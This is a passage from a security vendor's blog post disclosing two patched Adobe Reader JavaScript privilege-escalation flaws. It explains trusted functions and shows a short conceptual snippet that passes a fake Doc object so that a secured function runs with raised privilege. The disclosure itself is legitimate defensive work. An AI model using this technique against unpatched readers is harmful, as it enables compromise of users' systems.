<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Palo Alto Networks Discovers Two Adobe Reader Privileged JavaScript Zero-Days</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-20967 entry-meta">
			
			
			<span class="post-views-count">20,937</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'20967','like')"><i class="ui ui-2"></i><span class="ml-5">1</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 8</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days%2F+-+Palo+Alto+Networks+Discovers+Two+Adobe+Reader+Privileged+JavaScript+Zero-Days" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days%2F&title=Palo+Alto+Networks+Discovers+Two+Adobe+Reader+Privileged+JavaScript+Zero-Days&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/gal-de-leon/" title="Posts by Gal De Leon" class="author url fn" rel="author">Gal De Leon</a>        </p>
        <p><time datetime="2016-10-17T12:00:25+00:00">October 17, 2016 at 5:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/threat-prevention-2/" rel="category tag">Threat Prevention</a>, <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/adobe/" rel="tag">adobe</a>, <a href="https://unit42.paloaltonetworks.com/tag/adobe-reader/" rel="tag">Adobe Reader</a>, <a href="https://unit42.paloaltonetworks.com/tag/vulnerability/" rel="tag">vulnerability</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>We recently discovered two zero-day vulnerabilities in Adobe Reader. Adobe has since <a href="https://helpx.adobe.com/security/products/acrobat/apsb16-33.html">released a patch</a> (on October 6, 2016) to fix these vulnerabilities, which are named CVE-2016-6957 and CVE-2016-6958. These vulnerabilities could allow an attacker to compromise Adobe Reader by bypassing restrictions on JavaScript API execution (CVE-2016-6957) and security provisions that prevent arbitrary execution of scripts such as those written in Python (CVE-2016-6957). In this blog post, I will provide a technical walkthrough of these vulnerabilities, how they can be exploited, and how Palo Alto Networks customers are protected.</p>
<h3>JavaScript in PDF Files</h3>
<p>PDF file format is quite rich. It allows you to render text, pictures, and even 3D objects. It also contains a JavaScript engine that renders scripts embedded within a document. Such scripts are used to create dynamic content that interacts with the user. Adobe’s <a href="http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/js_api_reference.pdf">JavaScript API manual</a> documents most of the usable functions and global variables from such scripts.</p>
<p>JavaScript within a PDF file is executed under one of two different contexts – “priviledged” and “nonprivileged.”. In “privileged” context, the set of API functions that can be called is richer and contains some functions that can be dangerous if not used with great care. These functions are called secured functions, marked in the JavaScript API Manual by a red ‘S’ enclosed in a circle.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_1.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-20970" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_1.png" alt="zeroday_1" width="975" height="282" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_1.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_1-900x260.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_1-300x87.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_1-768x222.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_1-370x107.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p>There is a set of vulnerabilities called ‘JavaScript Privilege Escalation’. Such bugs allow JavaScript executing under nonprivileged context to run arbitrary scripts under privileged context and thus call any desired, secured function. Let’s look at an example of this scenario.</p>
<h3>Execution Stages</h3>
<p>JavaScript code usually executes under nonprivileged context. There are three exceptions where the context is automatically escalated to privileged context by Adobe’s engine:</p>
<ol>
<li><strong>Batch Application Initialization</strong> – JavaScript that executes when a document is loaded. This is done at a very early stage where an attacker cannot inject any JavaScript code. We will describe that stage in details later on.</li>
<li><strong>Console</strong> – JavaScript that is executed from Adobe Reader’s debugging console.</li>
<li><strong>Application Initialization Events</strong> – Callbacks for certain events.</li>
</ol>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_2.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-20973" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_2.png" alt="zeroday_2" width="975" height="156" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_2.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_2-900x144.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_2-300x48.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_2-768x123.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_2-370x59.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<h3>Batch Stage</h3>
<p>At this stage Adobe Reader executes all the JavaScript files located under the<br />
C:\Program Files\Adobe\Reader 11.0\Reader\Javascripts directory. Unless some custom script or plugin is deployed, this directory should only include the JSByteCodeWin.bin file.</p>
<p>JSByteCodeWin.bin consists of SpiderMonkey 1.8 XDR bytecode. It can be decompiled using a tool written by Gabor Molnar, which is found in his <a href="https://github.com/molnarg/dead0007">github</a>. By decompiling it you can see that Adobe implements many functions in JavaScript rather than native code. Since some of these functions need to execute secured functions, there is a need for some mechanism that allows it to execute them later on and not just in early/unique stages.</p>
<h3>Trusted Functions</h3>
<p>To solve this problem, Adobe introduced the concept of trusted functions. These can be defined by the secured function app.trustedFunction. Such functions can call secured functions, regardless of the execution stage.</p>
<p>Adobe defines many functions as trusted functions at the Batch stage in JSByteCodeWin.bin, so they can later be called.</p>
<p>An example is the ANSendApprovalToAuthorEnabled function:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebce462646945" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var ANSendApprovalToAuthorEnabled = app.trustedFunction(function (doc) {
    app.beginPriv();
    var hasAddr = doc.Collab.initiatorEmail; // privileged
    app.endPriv();
    ...
});</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebce462646945-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebce462646945-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebce462646945-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebce462646945-4">4</div><div class="crayon-num" data-line="crayon-5f694c693ebce462646945-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebce462646945-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebce462646945-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">ANSendApprovalToAuthorEnabled</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">trustedFunction</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">doc</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebce462646945-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">beginPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebce462646945-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">hasAddr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">doc</span><span class="crayon-sy">.</span><span class="crayon-v">Collab</span><span class="crayon-sy">.</span><span class="crayon-v">initiatorEmail</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// privileged</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebce462646945-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">endPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebce462646945-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebce462646945-6"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>Being a trusted function doesn’t mean that its entire code executes under privileged context. This only means that the function can modify its context by calling app.beginPriv. Only code that executes in between app.beginPriv and app.endPriv block is privileged. Note that privileged context isn’t “passed down” between functions you call from within the beginPriv/endPriv block, and those will have to call app.beginPriv to raise their privilege level as well. If a function context was ended without decreasing the privilege level (by calling app.endPriv), it will automatically decrease at the end of its scope.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_3.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-20976" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_3.png" alt="zeroday_3" width="975" height="316" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_3.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_3-900x292.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_3-300x97.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_3-768x249.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/10/ZeroDay_3-370x120.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<h3>Abusing Trusted Functions</h3>
<p>Imagine Adobe defines a trusted function at ‘Batch’ stage that looks like this:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebdb069400183" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var vulnerableFunc = app.trustedFunction(function (doc) {
    app.beginPriv();
    doc.displayText("Hello, World!"); /* vulnerableFunc() assumes argument is a Doc object */
    app.endPriv();
});</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebdb069400183-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebdb069400183-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebdb069400183-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebdb069400183-4">4</div><div class="crayon-num" data-line="crayon-5f694c693ebdb069400183-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebdb069400183-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">vulnerableFunc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">trustedFunction</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">doc</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebdb069400183-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">beginPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebdb069400183-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">doc</span><span class="crayon-sy">.</span><span class="crayon-e">displayText</span><span class="crayon-sy">(</span><span class="crayon-s">"Hello, World!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">/* vulnerableFunc() assumes argument is a Doc object */</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebdb069400183-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">endPriv</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebdb069400183-5"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>That means it can later raise its context to privileged by calling app.beginPriv. The vulnerableFunc function accepts an argument, ‘doc’, which it assumes to be of type ‘Doc’ object.</p>
<p>Since there are no type-safety checks in JavaScript, an attacker can pass any object as a doc argument. This allows attackers to execute any secured function they desire by abusing the above code.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c693ebdd667315024" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var fakeDoc = new Object();
fakeDoc.displayText = someSecuredFunction;
vulnerableFunc(fakeDoc, "Argument")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c693ebdd667315024-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c693ebdd667315024-2">2</div><div class="crayon-num" data-line="crayon-5f694c693ebdd667315024-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c693ebdd667315024-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">fakeDoc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-t">Object</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c693ebdd667315024-2"><span class="crayon-v">fakeDoc</span><span class="crayon-sy">.</span><span class="crayon-v">displayText</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">someSecuredFunction</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694c693ebdd667315024-3"><span class="crayon-e">vulnerableFunc</span><span class="crayon-sy">(</span><span class="crayon-v">fakeDoc</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"Argument"</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
